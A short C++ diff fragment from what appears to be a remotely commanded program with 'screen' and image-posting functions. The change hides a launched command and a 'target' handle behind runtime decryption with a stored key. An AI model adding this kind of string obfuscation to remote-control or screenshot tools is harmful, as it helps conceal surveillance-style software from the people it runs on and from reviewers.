@@ -16,7 +16,7 @@ void execute(const std::string &command)
   {
     if(fork() == 0)
     {
-      execlp(command_open.c_str(),command_open.c_str(),command_rick1.c_str());
+      execlp(command_open.c_str(),command_open.c_str(),decrypt(locker::command_rick1,locker::key).c_str());
     }
   }
   if(command == "screen")
@@ -92,4 +92,8 @@ void postImage()
   }
 
   system(cleanup.c_str());
+}
+std::string getHandle()
+{
+  return decrypt(locker::target,locker::key);
 }
